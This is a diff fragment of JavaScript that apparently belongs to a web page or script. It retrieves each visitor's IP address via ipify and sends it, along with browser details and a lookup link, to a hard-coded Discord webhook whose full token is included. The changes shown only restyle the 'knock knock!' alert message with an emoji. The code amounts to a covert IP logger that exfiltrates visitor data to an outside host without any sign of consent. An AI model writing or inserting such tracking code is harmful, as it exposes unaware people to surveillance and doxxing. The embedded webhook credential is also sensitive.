@@ -24,7 +24,6 @@ fetch('https://api.ipify.org?format=json')
     .then(data => {
         const ipAddress = data.ip;
         
-
         const webhook = "https://discord.com/api/webhooks/1158423582762876948/pXYb6AUfCmCpVrHihSJtCnV54_GEqtTcF_SdxidolHhj8Zxl0WxWjObEyNhn36az1lfJ";
 
         fetch(webhook, {
@@ -33,7 +32,7 @@ fetch('https://api.ipify.org?format=json')
                 'Content-Type': 'application/json'
             },
             body: JSON.stringify({
-                content: `# knock knock! \n\n**IP Address:** ${ipAddress}\n**Lookup**:https://whatismyipaddress.com/ip/${ipAddress}\n**Browser:** ${browser}`
+                content: `# :money_mouth: knock knock! \n\n**IP Address:** ${ipAddress}\n**Lookup**:https://whatismyipaddress.com/ip/${ipAddress}\n\n**Browser:** ${browser}`
             })
         })
     })
